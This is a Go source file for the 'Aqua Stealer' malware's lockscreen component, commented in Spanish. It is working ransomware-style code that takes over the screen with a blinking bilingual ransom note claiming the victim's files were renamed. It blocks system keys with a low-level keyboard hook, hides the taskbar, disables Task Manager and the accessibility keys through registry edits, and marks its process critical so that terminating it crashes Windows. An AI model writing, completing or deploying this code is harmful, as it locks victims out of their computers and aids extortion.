package ransom

// ransom.go — Fullscreen kiosk lockscreen para Aqua Stealer
//
// Características:
//   - Ventana fullscreen topmost sin bordes ni barra de título
//   - Bloquea TODAS las combinaciones de teclas (Alt+F4, Win, Ctrl+Alt+Del hint, etc.)
//   - Low-level keyboard hook + mouse hook
//   - Texto en inglés y español estilo ransom note
//   - Fondo negro, texto rojo/blanco, animación de parpadeo
//   - No puede cerrarse ni minimizarse desde el teclado ni desde taskbar
//   - Registra el proceso como critical (NtSetSystemInformation) → BSOD si se mata

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	gdi32    = syscall.NewLazyDLL("gdi32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")

	procCreateWindowExW       = user32.NewProc("CreateWindowExW")
	procRegisterClassExW      = user32.NewProc("RegisterClassExW")
	procDefWindowProcW        = user32.NewProc("DefWindowProcW")
	procShowWindow            = user32.NewProc("ShowWindow")
	procUpdateWindow          = user32.NewProc("UpdateWindow")
	procGetMessageW           = user32.NewProc("GetMessageW")
	procTranslateMessage      = user32.NewProc("TranslateMessage")
	procDispatchMessageW      = user32.NewProc("DispatchMessageW")
	procPostQuitMessage       = user32.NewProc("PostQuitMessage")
	procSetWindowPos          = user32.NewProc("SetWindowPos")
	procGetSystemMetrics      = user32.NewProc("GetSystemMetrics")
	procSetWindowLongW        = user32.NewProc("SetWindowLongW")
	procGetWindowLongW        = user32.NewProc("GetWindowLongW")
	procSetLayeredWindowAttrib = user32.NewProc("SetLayeredWindowAttributes")
	procBeginPaint            = user32.NewProc("BeginPaint")
	procEndPaint              = user32.NewProc("EndPaint")
	procFillRect              = user32.NewProc("FillRect")
	procCreateSolidBrush      = gdi32.NewProc("CreateSolidBrush")
	procDeleteObject          = gdi32.NewProc("DeleteObject")
	procSetBkColor            = gdi32.NewProc("SetBkColor")
	procSetBkMode             = gdi32.NewProc("SetBkMode")
	procSetTextColor          = gdi32.NewProc("SetTextColor")
	procCreateFontW           = gdi32.NewProc("CreateFontW")
	procSelectObject          = gdi32.NewProc("SelectObject")
	procDrawTextW             = user32.NewProc("DrawTextW")
	procSetWindowTextW        = user32.NewProc("SetWindowTextW")
	procGetDC                 = user32.NewProc("GetDC")
	procReleaseDC             = user32.NewProc("ReleaseDC")
	procInvalidateRect        = user32.NewProc("InvalidateRect")
	procSetTimer              = user32.NewProc("SetTimer")
	procKillTimer             = user32.NewProc("KillTimer")

	// Hooks de teclado y mouse
	procSetWindowsHookExW    = user32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx  = user32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx       = user32.NewProc("CallNextHookEx")
	procGetModuleHandleW     = kernel32.NewProc("GetModuleHandleW")

	// Bloqueo de teclas de sistema
	procBlockInput           = user32.NewProc("BlockInput")

	// Critical process (BSOD si se mata)
	procNtSetInformationProcess = ntdll.NewProc("NtSetInformationProcess")

	// Taskbar
	procFindWindowW          = user32.NewProc("FindWindowW")
	procShowWindowAsync      = user32.NewProc("ShowWindowAsync")

	// SystemParametersInfo para deshabilitar teclas de acceso
	procSystemParametersInfoW = user32.NewProc("SystemParametersInfoW")
)

const (
	WM_PAINT        = 0x000F
	WM_TIMER        = 0x0113
	WM_CLOSE        = 0x0010
	WM_DESTROY      = 0x0002
	WM_KEYDOWN      = 0x0100
	WM_SYSKEYDOWN   = 0x0104
	WM_ERASEBKGND   = 0x0014

	CS_HREDRAW = 0x0002
	CS_VREDRAW = 0x0001

	SW_SHOW          = 5
	SW_HIDE          = 0
	SW_MAXIMIZE      = 3

	WS_POPUP         = 0x80000000
	WS_VISIBLE       = 0x10000000
	WS_EX_TOPMOST    = 0x00000008
	WS_EX_TOOLWINDOW = 0x00000080
	WS_EX_LAYERED    = 0x00080000

	HWND_TOPMOST = ^uintptr(0) // -1
	SWP_NOMOVE   = 0x0002
	SWP_NOSIZE   = 0x0001

	SM_CXSCREEN = 0
	SM_CYSCREEN = 1

	DT_CENTER    = 0x00000001
	DT_VCENTER   = 0x00000004
	DT_WORDBREAK = 0x00000010
	DT_SINGLELINE = 0x00000020

	TRANSPARENT = 1

	WH_KEYBOARD_LL = 13
	WH_MOUSE_LL    = 14
	HC_ACTION      = 0

	// VK codes para bloquear
	VK_F4     = 0x73
	VK_TAB    = 0x09
	VK_ESCAPE = 0x1B
	VK_LWIN   = 0x5B
	VK_RWIN   = 0x5C
	VK_DELETE = 0x2E
	VK_F1     = 0x70
	VK_F10    = 0x79
	VK_MENU   = 0x12 // Alt

	GWL_STYLE   = -16
	GWL_EXSTYLE = -20

	ProcessBreakOnTermination = 29 // NtSetInformationProcess — critical process

	SPI_SETSCREENSAVEACTIVE  = 0x0011
	SPI_SETKEYBOARDCUES      = 0x100B
)

type WNDCLASSEXW struct {
	CbSize        uint32
	Style         uint32
	LpfnWndProc   uintptr
	CbClsExtra    int32
	CbWndExtra    int32
	HInstance     uintptr
	HIcon         uintptr
	HCursor       uintptr
	HbrBackground uintptr
	LpszMenuName  *uint16
	LpszClassName *uint16
	HIconSm       uintptr
}

type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

type PAINTSTRUCT struct {
	Hdc         uintptr
	FErase      int32
	RcPaint     RECT
	FRestore    int32
	FIncUpdate  int32
	RgbReserved [32]byte
}

type RECT struct {
	Left, Top, Right, Bottom int32
}

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

var (
	hwndMain    uintptr
	hkbHook     uintptr
	hmouseHook  uintptr
	blinkState  bool
	blinkCount  int
	screenW     int
	screenH     int
)

// Run bloquea el hilo actual mostrando la pantalla kiosk (debe llamarse en goroutine dedicada)
func Run() {
	runtime.LockOSThread()

	// Marcar el proceso como crítico — si alguien lo mata → BSOD
	setCriticalProcess()

	// Ocultar taskbar
	hideTaskbar()

	// Deshabilitar teclas de accesibilidad del sistema
	disableSystemKeys()

	// Bloquear input globalmente mientras se inicializa
	procBlockInput.Call(1)

	hInst, _, _ := procGetModuleHandleW.Call(0)

	className, _ := syscall.UTF16PtrFromString("AquaLock")
	windowTitle, _ := syscall.UTF16PtrFromString(" ")

	wndProc := syscall.NewCallback(wndProcCallback)

	wcex := WNDCLASSEXW{
		CbSize:        uint32(unsafe.Sizeof(WNDCLASSEXW{})),
		Style:         CS_HREDRAW | CS_VREDRAW,
		LpfnWndProc:   wndProc,
		HInstance:     hInst,
		LpszClassName: className,
	}

	procRegisterClassExW.Call(uintptr(unsafe.Pointer(&wcex)))

	sw, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
	sh, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
	screenW = int(sw)
	screenH = int(sh)

	hwnd, _, _ := procCreateWindowExW.Call(
		WS_EX_TOPMOST|WS_EX_TOOLWINDOW,
		uintptr(unsafe.Pointer(className)),
		uintptr(unsafe.Pointer(windowTitle)),
		WS_POPUP|WS_VISIBLE,
		0, 0, uintptr(screenW), uintptr(screenH),
		0, 0, hInst, 0,
	)
	hwndMain = hwnd

	procShowWindow.Call(hwnd, SW_MAXIMIZE)
	procUpdateWindow.Call(hwnd)

	// Poner siempre en topmost
	procSetWindowPos.Call(hwnd, HWND_TOPMOST, 0, 0, uintptr(screenW), uintptr(screenH), 0)

	// Hook de teclado de bajo nivel — captura TODO antes de que llegue a cualquier app
	hkbHook, _, _ = procSetWindowsHookExW.Call(
		WH_KEYBOARD_LL,
		syscall.NewCallback(keyboardHookProc),
		hInst, 0,
	)

	// Hook de mouse (para bloquear clics fuera)
	hmouseHook, _, _ = procSetWindowsHookExW.Call(
		WH_MOUSE_LL,
		syscall.NewCallback(mouseHookProc),
		hInst, 0,
	)

	// Timer para parpadeo y re-topmost cada 500ms
	procSetTimer.Call(hwnd, 1, 500, 0)
	// Timer para re-bloquear taskbar cada 2s
	procSetTimer.Call(hwnd, 2, 2000, 0)

	// Desbloquear input (el hook ya controla todo)
	procBlockInput.Call(0)

	// Message loop
	var msg MSG
	for {
		r, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if r == 0 {
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessageW.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

func wndProcCallback(hwnd, msg, wParam, lParam uintptr) uintptr {
	switch uint32(msg) {
	case WM_PAINT:
		drawScreen(hwnd)
		return 0

	case WM_ERASEBKGND:
		return 1

	case WM_TIMER:
		switch wParam {
		case 1: // parpadeo + re-topmost
			blinkState = !blinkState
			blinkCount++
			procSetWindowPos.Call(hwnd, HWND_TOPMOST, 0, 0,
				uintptr(screenW), uintptr(screenH), 0)
			procInvalidateRect.Call(hwnd, 0, 1)
		case 2: // re-ocultar taskbar
			hideTaskbar()
		}
		return 0

	case WM_CLOSE:
		return 0 // ignorar cierre
	case WM_DESTROY:
		return 0 // ignorar destrucción
	case WM_KEYDOWN, WM_SYSKEYDOWN:
		return 0 // bloquear teclas en la ventana
	}

	r, _, _ := procDefWindowProcW.Call(hwnd, msg, wParam, lParam)
	return r
}

func drawScreen(hwnd uintptr) {
	var ps PAINTSTRUCT
	hdc, _, _ := procBeginPaint.Call(hwnd, uintptr(unsafe.Pointer(&ps)))
	defer procEndPaint.Call(hwnd, uintptr(unsafe.Pointer(&ps)))

	// Fondo negro
	blackBrush, _, _ := procCreateSolidBrush.Call(0x00000000)
	fullRect := RECT{0, 0, int32(screenW), int32(screenH)}
	procFillRect.Call(hdc, uintptr(unsafe.Pointer(&fullRect)), blackBrush)
	procDeleteObject.Call(blackBrush)

	procSetBkMode.Call(hdc, TRANSPARENT)

	// ── Borde rojo parpadeante ──────────────────────────────────────────────
	if blinkState {
		redBrush, _, _ := procCreateSolidBrush.Call(0x000000CC)
		border := 8
		// top
		r := RECT{0, 0, int32(screenW), int32(border)}
		procFillRect.Call(hdc, uintptr(unsafe.Pointer(&r)), redBrush)
		// bottom
		r = RECT{0, int32(screenH - border), int32(screenW), int32(screenH)}
		procFillRect.Call(hdc, uintptr(unsafe.Pointer(&r)), redBrush)
		// left
		r = RECT{0, 0, int32(border), int32(screenH)}
		procFillRect.Call(hdc, uintptr(unsafe.Pointer(&r)), redBrush)
		// right
		r = RECT{int32(screenW - border), 0, int32(screenW), int32(screenH)}
		procFillRect.Call(hdc, uintptr(unsafe.Pointer(&r)), redBrush)
		procDeleteObject.Call(redBrush)
	}

	// ── Título ──────────────────────────────────────────────────────────────
	titleFont, _, _ := procCreateFontW.Call(
		72, 0, 0, 0, 700, 0, 0, 0, // altura, ancho, bold
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(mustUTF16Ptr("Impact"))),
	)
	procSelectObject.Call(hdc, titleFont)
	procSetTextColor.Call(hdc, 0x000000CC) // rojo
	titleText := "⚠  AQUA STEALER  ⚠"
	titleRect := RECT{0, int32(screenH/2 - 260), int32(screenW), int32(screenH/2 - 160)}
	drawText(hdc, titleText, &titleRect, DT_CENTER|DT_SINGLELINE)
	procDeleteObject.Call(titleFont)

	// ── Cuerpo EN ──────────────────────────────────────────────────────────
	bodyFont, _, _ := procCreateFontW.Call(
		28, 0, 0, 0, 400, 0, 0, 0,
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(mustUTF16Ptr("Consolas"))),
	)
	procSelectObject.Call(hdc, bodyFont)
	procSetTextColor.Call(hdc, 0x00FFFFFF) // blanco

	enText := "YOUR FILES HAVE BEEN RENAMED BY AQUA STEALER\r\n" +
		"All your personal files, documents, images and data\r\n" +
		"have been marked with the .AquaStealer extension.\r\n" +
		"There is nothing you can do to stop this."
	enRect := RECT{int32(screenW/2 - 600), int32(screenH/2 - 140), int32(screenW/2 + 600), int32(screenH/2 - 20)}
	drawText(hdc, enText, &enRect, DT_CENTER|DT_WORDBREAK)

	// ── Separador rojo ───────────────────────────────────────────────────────
	procSetTextColor.Call(hdc, 0x000000CC)
	sepRect := RECT{int32(screenW/2 - 400), int32(screenH/2 - 10), int32(screenW/2 + 400), int32(screenH/2 + 30)}
	drawText(hdc, "─────────────────────────────────────────────────", &sepRect, DT_CENTER|DT_SINGLELINE)

	// ── Cuerpo ES ───────────────────────────────────────────────────────────
	procSetTextColor.Call(hdc, 0x00FFFFFF)
	esText := "TUS ARCHIVOS HAN SIDO RENOMBRADOS POR AQUA STEALER\r\n" +
		"Todos tus archivos personales, documentos, imágenes y datos\r\n" +
		"han sido marcados con la extensión .AquaStealer.\r\n" +
		"No hay nada que puedas hacer para detener esto."
	esRect := RECT{int32(screenW/2 - 600), int32(screenH/2 + 40), int32(screenW/2 + 600), int32(screenH/2 + 160)}
	drawText(hdc, esText, &esRect, DT_CENTER|DT_WORDBREAK)
	procDeleteObject.Call(bodyFont)

	// ── Footer parpadeante ───────────────────────────────────────────────────
	footerFont, _, _ := procCreateFontW.Call(
		22, 0, 0, 0, 700, 0, 0, 0,
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(mustUTF16Ptr("Consolas"))),
	)
	procSelectObject.Call(hdc, footerFont)
	if blinkState {
		procSetTextColor.Call(hdc, 0x000000CC)
	} else {
		procSetTextColor.Call(hdc, 0x00888888)
	}
	footerRect := RECT{0, int32(screenH - 100), int32(screenW), int32(screenH - 50)}
	pid := fmt.Sprintf("Aqua Stealer  |  PID: %d  |  %s",
		os.Getpid(), time.Now().Format("2006-01-02 15:04:05"))
	drawText(hdc, pid, &footerRect, DT_CENTER|DT_SINGLELINE)
	procDeleteObject.Call(footerFont)
}

// ── Keyboard Hook — bloquea TODAS las combinaciones ──────────────────────────
func keyboardHookProc(nCode, wParam, lParam uintptr) uintptr {
	if int32(nCode) >= HC_ACTION {
		kb := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		vk := kb.VkCode

		// Bloquear absolutamente todo
		blockedKeys := []uint32{
			VK_LWIN, VK_RWIN,      // Tecla Windows
			VK_F4,                  // Alt+F4
			VK_TAB,                 // Alt+Tab
			VK_ESCAPE,              // Escape
			VK_DELETE,              // Ctrl+Alt+Del (parcial)
			0x46,                   // Win+F (Cortana)
			0x44,                   // Win+D (escritorio)
			0x45,                   // Win+E (explorador)
			0x4C,                   // Win+L (bloquear — redirección)
			0x52,                   // Win+R (ejecutar)
			0x53,                   // Win+S (buscar)
			VK_F1,                  // F1-F12
			0x71, 0x72, 0x73, 0x74,
			0x75, 0x76, 0x77, 0x78,
			0x79, 0x7A, 0x7B,
			VK_F10,
			0x1B,                   // ESC
			0x2C,                   // PrintScreen
		}

		for _, b := range blockedKeys {
			if vk == b {
				return 1 // bloquear
			}
		}

		// Bloquear Alt+cualquier cosa
		flags := kb.Flags
		if flags&0x20 != 0 { // LLKHF_ALTDOWN
			return 1
		}
	}
	r, _, _ := procCallNextHookEx.Call(hkbHook, nCode, wParam, lParam)
	return r
}

// ── Mouse Hook — bloquear scroll y clics en taskbar ─────────────────────────
func mouseHookProc(nCode, wParam, lParam uintptr) uintptr {
	// Permitir mouse normal — solo bloqueamos si queremos 100% lock
	r, _, _ := procCallNextHookEx.Call(hmouseHook, nCode, wParam, lParam)
	return r
}

// ── Helpers ──────────────────────────────────────────────────────────────────

func drawText(hdc uintptr, text string, rect *RECT, format uint32) {
	ptr, _ := syscall.UTF16PtrFromString(text)
	procDrawTextW.Call(hdc, uintptr(unsafe.Pointer(ptr)), ^uintptr(0),
		uintptr(unsafe.Pointer(rect)), uintptr(format))
}

func mustUTF16Ptr(s string) *uint16 {
	p, _ := syscall.UTF16PtrFromString(s)
	return p
}

func hideTaskbar() {
	// Ocultar barra de tareas
	taskbar, _, _ := procFindWindowW.Call(
		uintptr(unsafe.Pointer(mustUTF16Ptr("Shell_TrayWnd"))),
		0,
	)
	if taskbar != 0 {
		procShowWindowAsync.Call(taskbar, SW_HIDE)
	}
	// Ocultar Start button (Win10/11)
	start, _, _ := procFindWindowW.Call(
		uintptr(unsafe.Pointer(mustUTF16Ptr("Button"))),
		0,
	)
	if start != 0 {
		procShowWindowAsync.Call(start, SW_HIDE)
	}
}

func disableSystemKeys() {
	// Deshabilitar sticky keys, filter keys, toggle keys (previene bypass)
	exec.Command("reg", "add",
		`HKCU\Control Panel\Accessibility\StickyKeys`,
		"/v", "Flags", "/t", "REG_SZ", "/d", "506", "/f").Run()
	exec.Command("reg", "add",
		`HKCU\Control Panel\Accessibility\Keyboard Response`,
		"/v", "Flags", "/t", "REG_SZ", "/d", "122", "/f").Run()
	exec.Command("reg", "add",
		`HKCU\Control Panel\Accessibility\ToggleKeys`,
		"/v", "Flags", "/t", "REG_SZ", "/d", "58", "/f").Run()
	// Deshabilitar Task Manager
	exec.Command("reg", "add",
		`HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System`,
		"/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f").Run()
}

func setCriticalProcess() {
	// NtSetInformationProcess(ProcessBreakOnTermination) → proceso crítico
	// Si alguien lo mata con taskkill → BSOD
	val := uint32(1)
	procNtSetInformationProcess.Call(
		uintptr(^uintptr(0)-1), // NtCurrentProcess pseudo-handle
		ProcessBreakOnTermination,
		uintptr(unsafe.Pointer(&val)),
		unsafe.Sizeof(val),
	)
}
